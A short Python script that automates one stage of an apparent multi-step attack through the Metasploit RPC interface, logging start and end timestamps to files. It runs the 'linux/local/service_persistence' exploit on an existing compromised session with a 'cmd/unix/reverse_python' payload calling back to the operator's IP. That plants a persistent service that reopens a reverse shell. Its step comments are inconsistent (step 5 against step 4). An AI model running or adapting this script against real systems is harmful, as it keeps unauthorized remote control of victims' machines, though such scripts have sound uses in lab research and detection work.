import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]

    client = MsfRpcClient('kali')

    # start step 5
    output_time_file_start = 'time_step_4_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    exploit['SESSION'] = 2
    exploit['VERBOSE'] = True
    payload['LHOST'] = my_ip

    exploit.execute(payload=payload)

    #client.sessions.session('1').stop()
    #client.sessions.session('2').stop()
    #client.sessions.session('3').stop()
    
    # end step 4
    output_time_file_end = 'time_step_4_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)



main(sys.argv)
